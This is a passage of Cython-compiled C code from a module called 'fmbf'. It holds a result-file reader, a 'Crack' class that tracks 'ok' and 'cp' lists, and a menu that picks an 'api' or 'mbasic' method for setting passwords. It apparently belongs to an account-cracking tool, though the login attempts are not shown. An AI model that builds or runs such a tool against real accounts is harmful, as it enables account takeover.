  __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
    __Pyx_XGOTREF(__pyx_t_10);
    __Pyx_XGOTREF(__pyx_t_11);
    __Pyx_XGOTREF(__pyx_t_12);
     {

      
      __pyx_t_4 = PyNumber_Add(__pyx_v_folder, __pyx_kp_s__48); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_13 = PyNumber_Add(__pyx_t_4, __pyx_v_ask); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_13);
      PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_13);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_r);
      __pyx_t_13 = 0;
      __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_read); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __pyx_t_13 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_13)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_13);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_5 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_splitlines); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L8_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_file = __pyx_t_1;
      __pyx_t_1 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    goto __pyx_L13_try_end;
    __pyx_L8_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

    
     {
      __Pyx_AddTraceback("fmbf.Main.cek_result", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_4, &__pyx_t_5) < 0) __PYX_ERR(0, 192, __pyx_L10_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_5);

      
      __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 193, __pyx_L10_except_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L9_exception_handled;
    }
    __pyx_L10_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
    goto __pyx_L1_error;
    __pyx_L9_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_10);
    __Pyx_XGIVEREF(__pyx_t_11);
    __Pyx_XGIVEREF(__pyx_t_12);
    __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
    __pyx_L13_try_end:;
  }

  
  __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = 0;
  __pyx_t_9 = 127;
  __Pyx_INCREF(__pyx_kp_u_tanggal);
  __pyx_t_6 += 15;
  __Pyx_GIVEREF(__pyx_kp_u_tanggal);
  PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_tanggal);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ask, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u_total);
  __pyx_t_6 += 11;
  __Pyx_GIVEREF(__pyx_kp_u_total);
  PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_total);
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 194, __pyx_L1_error) }
  __pyx_t_8 = PyObject_Length(__pyx_v_file); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 194, __pyx_L1_error)
  __pyx_t_4 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_8, 0, ' ', 'd'); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __Pyx_INCREF(__pyx_kp_u__39);
  __pyx_t_6 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__39);
  PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_kp_u__39);
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_6, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 195, __pyx_L1_error) }
  if (likely(PyList_CheckExact(__pyx_v_file)) || PyTuple_CheckExact(__pyx_v_file)) {
    __pyx_t_5 = __pyx_v_file; __Pyx_INCREF(__pyx_t_5); __pyx_t_6 = 0;
    __pyx_t_7 = NULL;
  } else {
    __pyx_t_6 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_v_file); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 195, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_7 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 195, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_7)) {
      if (likely(PyList_CheckExact(__pyx_t_5))) {
        if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_5)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_6); __Pyx_INCREF(__pyx_t_4); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 195, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 195, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      } else {
        if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_6); __Pyx_INCREF(__pyx_t_4); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 195, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 195, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_7(__pyx_t_5);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 195, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_z, __pyx_t_4);
    __pyx_t_4 = 0;

    
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_z); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 196, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
  }
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 197, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("fmbf.Main.cek_result", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_res);
  __Pyx_XDECREF(__pyx_v_folder);
  __Pyx_XDECREF(__pyx_v_num);
  __Pyx_XDECREF(__pyx_v_dirs);
  __Pyx_XDECREF(__pyx_v_fil);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_z);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_1__init__ = {"__init__", (PyCFunction)__pyx_pw_4fmbf_5Crack_1__init__, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_5Crack___init__(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_5Crack___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_int_0) < 0) __PYX_ERR(0, 204, __pyx_L1_error)

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_ok, __pyx_t_1) < 0) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 206, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_cp, __pyx_t_1) < 0) __PYX_ERR(0, 206, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 207, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_mtd, __pyx_t_1) < 0) __PYX_ERR(0, 207, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_now); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_strftime); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_2, __pyx_kp_s_A_d_B_Y) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s_A_d_B_Y);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_txt); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini, __pyx_t_4) < 0) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("fmbf.Crack.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_5Crack_3atursandi(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_5Crack_3atursandi = {"atursandi", (PyCFunction)__pyx_pw_4fmbf_5Crack_3atursandi, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_5Crack_3atursandi(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("atursandi (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_5Crack_2atursandi(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_5Crack_2atursandi(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_method = NULL;
  PyObject *__pyx_v_urutan = NULL;
  PyObject *__pyx_v_xx = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  Py_ssize_t __pyx_t_2;
  Py_UCS4 __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  int __pyx_t_7;
  int __pyx_t_8;
  int __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("atursandi", 0);

  
  __pyx_t_1 = PyTuple_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = 0;
  __pyx_t_3 = 127;
  __Pyx_INCREF(__pyx_kp_u_total_id);
  __pyx_t_2 += 19;
  __Pyx_GIVEREF(__pyx_kp_u_total_id);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_total_id);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_M); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_idz); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = PyObject_Length(__pyx_t_5); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_6, 0, ' ', 'd'); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_N); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_3 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_3) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_3;
  __pyx_t_2 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_4);
  __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 4, __pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 212, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 213, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 215, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_method = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_method);
  __pyx_t_1 = __pyx_v_method;
  __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 216, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_7 = __pyx_t_8;
    goto __pyx_L4_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 216, __pyx_L1_error)
  __pyx_t_7 = __pyx_t_8;
  __pyx_L4_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_8 = (__pyx_t_7 != 0);
  if (__pyx_t_8) {

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 217, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_n_s_api); if (unlikely(__pyx_t_9 == ((int)-1))) __PYX_ERR(0, 217, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_method);
  __pyx_t_1 = __pyx_v_method;
  __pyx_t_7 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 218, __pyx_L1_error)
  if (!__pyx_t_7) {
  } else {
    __pyx_t_8 = __pyx_t_7;
    goto __pyx_L6_bool_binop_done;
  }
  __pyx_t_7 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 218, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_7;
  __pyx_L6_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_7 = (__pyx_t_8 != 0);
  if (__pyx_t_7) {

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 219, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_n_s_mbasic); if (unlikely(__pyx_t_9 == ((int)-1))) __PYX_ERR(0, 219, __pyx_L1_error)
